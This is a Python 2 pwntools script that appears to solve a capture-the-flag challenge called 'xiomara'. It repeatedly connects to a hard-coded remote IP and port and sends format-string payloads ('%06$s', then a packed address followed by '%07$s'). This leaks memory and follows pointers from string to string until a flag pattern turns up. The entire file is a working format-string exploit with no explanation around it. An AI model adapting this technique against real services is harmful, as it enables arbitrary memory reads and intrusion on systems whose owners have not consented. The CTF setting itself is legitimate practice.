from pwn import *
import re
import sys

ADDRESS_REGEX = re.compile(r'0[xX][0-9a-fA-F]+')
FLAG_REGEX = re.compile(r'xiomara{.*}')

def get_start_address(server_ip, port):
  conn = remote(server_ip, port)
  conn.sendline('%06$s')
  return_data = conn.recvline().rstrip('\n')
  conn.close()
  if ADDRESS_REGEX.search(return_data):
    string_address = ADDRESS_REGEX.search(return_data).group(0)
    if string_address[-2:] == '00':
      return int(string_address,16) + 1
    else:
      return int(string_address,16)
  else:
    print 'Remote address not found! Server return data: %s' % (return_data)
    sys.exit(1)

def get_next_address(server_ip, port, address):
  conn = remote(server_ip, port)
  conn.sendline('%s%s' % (p32(address), '%07$s'))
  return_data = conn.recvline().rstrip('\n')
  conn.close()
  if ADDRESS_REGEX.search(return_data):
    string_address = ADDRESS_REGEX.search(return_data).group(0)
    if string_address[-2:] == '00':
      return int(string_address,16) + 1
    else:
      return int(string_address,16)
  else:
    print 'Remote address not found. Checking for flag!'
    if FLAG_REGEX.search(return_data):
      print 'Flag found: %s' % (FLAG_REGEX.search(return_data).group(0))
    else:
      print 'Flag not found :(! return_data: %s' % (return_data)
    sys.exit(1)


def main():
  # Read binary an libc
  address = get_start_address('139.59.61.220', 52345)

  # Follow the server till we get the flag
  while True:
    print 'Getting string at 0x%08x' % (address)
    address = get_next_address('139.59.61.220', 52345, address)

# Hook
if __name__ == '__main__':
  main()